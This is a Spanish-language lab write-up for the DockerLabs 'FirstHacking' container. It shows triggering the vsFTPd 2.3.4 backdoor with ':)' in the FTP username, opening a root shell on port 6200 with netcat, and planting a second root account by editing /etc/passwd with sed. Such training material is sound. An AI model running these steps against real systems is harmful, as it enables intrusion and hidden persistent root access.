# FirstHacking
Laboratorio DockerLabs

# 🧪 Reporte de Laboratorio: Explotación y Post-Explotación en Entorno Docker (vsFTPd 2.3.4)

## 📌 Resumen del Laboratorio

En este laboratorio de ciberseguridad (**FirstHacking**) se llevó a cabo el reconocimiento, la explotación manual de una vulnerabilidad en el servicio de transferencia de archivos (**vsFTPd 2.3.4**) y tareas posteriores de **post-explotación**, **administración de usuarios** y **manipulación de identidades (UID/GID)** dentro de un contenedor Linux minimalista.

## 🎯 Objetivos

* Explotar la backdoor de vsFTPd 2.3.4 y obtener acceso como `root`.
* [x] **Reconocimiento y Análisis:** Escaneo de puertos y detección de versiones de servicios.
* [x] **Explotación Manual:** Intercepción de la vulnerabilidad en el puerto `21/TCP` (vsFTPd 2.3.4).
* [x] **Acceso Remoto:** Establecimiento de una consola interactiva a través de la puerta trasera en el puerto `6200/TCP` usando `netcat` (`nc`).
* [x] **Auditoría del Sistema:** Inspección de la estructura de archivos (`/etc/passwd`) y reconocimiento del entorno.
* [x] **Creación de Usuarios y Escalación:** Gestión del usuario `jtique` y elevación a UID 0 mediante la herramienta de flujo `sed`.
* [x] **Estructuración del Entorno:** Configuración de la jerarquía de directorios estándar y verificación de permisos.

## 🛠️ Herramientas Utilizadas

| Herramienta / Comando | Propósito / Uso en el Laboratorio |
| :--- | :--- |
| **`Nmap`** | Escaneo de puertos y detección de versiones (`-sCV`). |
| **`FTP`** | Interacción con el puerto 21 para activar la puerta trasera enviando la secuencia `:)`. |
| **`Netcat (nc)`** | Conexión e interacción manual con la terminal remota en el puerto `6200`. |
| **`sed`** | Edición directa de `/etc/passwd` para modificación de identificadores (UID/GID). |
| **`adduser` / `chown`** | Creación de usuarios y asignación recursiva de propietarios en el sistema. |

---

## 🚀 Paso a Paso de la Práctica

### 1. Reconocimiento

Se utilizó `nmap` para el escaneo de puertos y el parámetro `-sCV` para obtener las versiones de los servicios activos. Esto reveló un único puerto abierto:

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsFTPd 2.3.4
```

### 2. Identificación de Vulnerabilidades

La versión **vsFTPd 2.3.4** contiene una puerta trasera conocida que se activa al ingresar los caracteres `:)` en el nombre de usuario al realizar la autenticación FTP. Esto provoca que la aplicación abra un puerto de escucha en el `6200/TCP` con acceso directo a una shell con privilegios de `root`.

### 3. Explotación

#### A. Activar la Backdoor mediante FTP
Se envió la secuencia requerida en el campo de usuario e introdujo cualquier contraseña para disparar el disparador interno del servicio:

```text
FTP 172.17.0.2

Connected to 172.17.0.2
220 (vsFTPd 2.3.4)
Name (172.17.0.2:kali): usuario:)
331 Please specify the password.
Password:
```

#### B. Conexión a la Shell Remota
Una vez activa la puerta trasera, el puerto 6200 quedó abierto. Se utilizó `netcat` para conectarse a la consola remota y verificar la identidad:

```bash
netcat 172.17.0.2 6200
whoami
root
```

### 4. Post-Explotación y Gestión de Usuarios

#### A. Creación del Usuario
Se creó un nuevo usuario llamado `jtique`:

```bash
adduser jtique
```

Verificación inicial en `/etc/passwd`:
```text
jtique:x:1000:1000:,,,:/home/jtique:/bin/bash
```

#### B. Escalación de Privilegios a Nivel de Kernel (UID 0)
Se modificaron los identificadores del usuario directamente en la tabla del sistema mediante `sed` para asignarle UID y GID `0`:

```bash
sed -i 's/jtique:x:1000:1000:/jtique:x:0:0:/g' /etc/passwd
```

Resultado final en `/etc/passwd`:
```text
jtique:x:0:0::,,,:/home/jtique:/bin/bash
```

#### C. Estructuración del Entorno de Trabajo
Se generó el árbol de carpetas personales y se ajustó la propiedad de los archivos:

```bash
cd /home/jtique
mkdir -p Escritorio Documentos Descargas Imágenes Música Vídeos scripts lab_files
chown -R jtique:jtique /home/jtique
```

---

## 🧠 Conclusión

**FirstHacking** es una máquina introductoria ideal para practicar la metodología básica de seguridad ofensiva: escaneo de puertos, detección de versiones y explotación de vulnerabilidades conocidas. Esta práctica evidencia el riesgo que representa el despliegue de software no actualizado o con vulnerabilidades documentadas en entornos de producción.
